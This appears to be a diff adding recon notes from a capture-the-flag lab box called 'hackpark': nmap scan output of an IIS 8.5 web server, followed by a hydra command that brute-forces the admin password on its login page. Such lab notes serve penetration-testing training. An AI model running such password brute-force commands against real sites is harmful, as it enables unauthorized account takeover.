@@ -1,1 +1,33 @@
 
+
+RECON
+
+Nmap scan report for ip-10-10-208-52.eu-west-1.compute.internal (10.10.208.52)
+Host is up (0.00064s latency).
+Not shown: 2999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods: 
+|   Supported Methods: GET HEAD OPTIONS TRACE POST
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 6 disallowed entries 
+| /Account/*.* /search /search.aspx /error404.aspx 
+|_/archive /archive.aspx
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+MAC Address: 02:E8:F8:C9:6A:E3 (Unknown)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.002 days (since Thu Mar 14 20:24:51 2024)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+hydra -l admin -P /usr/share/wordlists/<wordlist> http://10.10.208.52/Account/login.aspx http-post-form
